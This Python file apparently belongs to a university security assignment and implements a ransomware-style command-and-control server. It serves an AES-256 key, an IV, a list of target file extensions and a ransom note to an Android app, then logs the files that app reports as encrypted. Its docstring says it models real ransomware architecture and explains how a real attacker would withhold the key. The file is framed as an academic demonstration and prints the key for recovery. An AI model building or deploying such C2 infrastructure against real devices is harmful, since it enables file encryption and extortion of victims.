"""
FaceAuth Payload Server
=======================
Simulates a C2 (Command and Control) server that delivers the encryption
payload to the Android app on the fly when Class B is detected.

The Android app contains ONLY the encryption algorithm (AES-256-CBC).
It contains NO key, NO parameters, and NO file targets.
All of these are fetched from this server at runtime — making the
encryption code inert unless the server is reachable.

This models real ransomware architecture:
  - Symmetric key is generated server-side
  - App cannot encrypt without contacting the server
  - Server can selectively withhold or deliver the payload

Run:
    python payload_server.py

Then start the Android emulator.
The app connects to http://10.0.2.2:8888/payload
(10.0.2.2 is the emulator's alias for the host machine's localhost)

Endpoints:
    GET  /payload     → delivers encryption parameters
    GET  /status      → shows how many apps have fetched the payload
    GET  /files       → shows what files were reported as encrypted
    POST /report      → Android app reports back which files were encrypted
    GET  /health      → simple health check
"""

import http.server
import json
import base64
import os
import threading
import datetime
from urllib.parse import urlparse, parse_qs

# ── Generate a fresh AES-256 key and IV for this server session ──────────────
# In real ransomware this key would be asymmetrically encrypted with the
# attacker's public key so only they can decrypt. Here we log it clearly
# so the academic demonstration can be reversed.

AES_KEY_BYTES = os.urandom(32)   # 256-bit key
AES_IV_BYTES  = os.urandom(16)   # 128-bit IV

PAYLOAD = {
    "algorithm":         "AES/CBC/PKCS5Padding",
    "key_b64":           base64.b64encode(AES_KEY_BYTES).decode(),
    "iv_b64":            base64.b64encode(AES_IV_BYTES).decode(),
    "target_extensions": [".txt", ".log", ".json", ".csv", ".pdf"],
    "ransom_note":       (
        "=== ACADEMIC DEMONSTRATION ===\n"
        "Your files have been encrypted by FaceAuth Security Demo.\n"
        "This is a CS402M assignment demonstration only.\n"
        "Unauthorised user detected via MobileNetV2 face classifier.\n"
        "Encryption: AES-256-CBC  Key: fetched from payload server\n"
        "Contact: [your-email]@university.edu to recover files.\n"
        "=============================="
    ),
    "server_timestamp":  datetime.datetime.utcnow().isoformat() + "Z",
    "session_id":        base64.b64encode(os.urandom(8)).decode(),
}

# ── Server state ──────────────────────────────────────────────────────────────
state = {
    "fetch_count":    0,
    "reported_files": [],
    "fetch_times":    [],
}
state_lock = threading.Lock()

HOST = "0.0.0.0"
PORT = 8888


class PayloadHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {fmt % args}")

    def _send_json(self, data: dict, status: int = 200):
        body = json.dumps(data, indent=2).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _send_text(self, text: str, status: int = 200):
        body = text.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path   = parsed.path

        if path == "/payload":
            self._handle_payload()
        elif path == "/status":
            self._handle_status()
        elif path == "/files":
            self._handle_files()
        elif path == "/health":
            self._send_json({"status": "ok", "port": PORT})
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        if self.path == "/report":
            self._handle_report()
        else:
            self._send_json({"error": "not found"}, 404)

    def _handle_payload(self):
        """Deliver the encryption payload to the Android app."""
        with state_lock:
            state["fetch_count"] += 1
            state["fetch_times"].append(
                datetime.datetime.now().strftime("%H:%M:%S")
            )
        print(f"\n{'='*55}")
        print(f"  ⚡  PAYLOAD DELIVERED  (fetch #{state['fetch_count']})")
        print(f"  Key  : {PAYLOAD['key_b64'][:24]}...")
        print(f"  IV   : {PAYLOAD['iv_b64'][:16]}...")
        print(f"  From : {self.client_address[0]}")
        print(f"{'='*55}\n")
        self._send_json(PAYLOAD)

    def _handle_status(self):
        """Return server status and fetch count."""
        with state_lock:
            self._send_json({
                "payload_fetches": state["fetch_count"],
                "fetch_times":     state["fetch_times"],
                "encrypted_files": len(state["reported_files"]),
                "session_id":      PAYLOAD["session_id"],
            })

    def _handle_files(self):
        """Return list of files reported as encrypted."""
        with state_lock:
            self._send_json({
                "encrypted_files": state["reported_files"],
                "total":           len(state["reported_files"]),
            })

    def _handle_report(self):
        """Android app reports which files were encrypted."""
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)
        try:
            data = json.loads(body)
            files = data.get("encrypted_files", [])
            with state_lock:
                state["reported_files"].extend(files)
            print(f"\n📁 App reported {len(files)} encrypted file(s):")
            for f in files:
                print(f"   {f}")
            self._send_json({"acknowledged": True, "count": len(files)})
        except Exception as e:
            self._send_json({"error": str(e)}, 400)


def main():
    print("\n" + "=" * 55)
    print("  FaceAuth Payload Server")
    print("=" * 55)
    print(f"  Listening : http://{HOST}:{PORT}")
    print(f"  Android   : http://10.0.2.2:{PORT}/payload")
    print()
    print(f"  Session AES-256 key (for recovery):")
    print(f"  Key : {base64.b64encode(AES_KEY_BYTES).decode()}")
    print(f"  IV  : {base64.b64encode(AES_IV_BYTES).decode()}")
    print()
    print("  Waiting for Android app to fetch payload...")
    print("=" * 55 + "\n")

    server = http.server.HTTPServer((HOST, PORT), PayloadHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[Server stopped]")
        with state_lock:
            print(f"Total payload fetches : {state['fetch_count']}")
            print(f"Files reported        : {len(state['reported_files'])}")


if __name__ == "__main__":
    main()
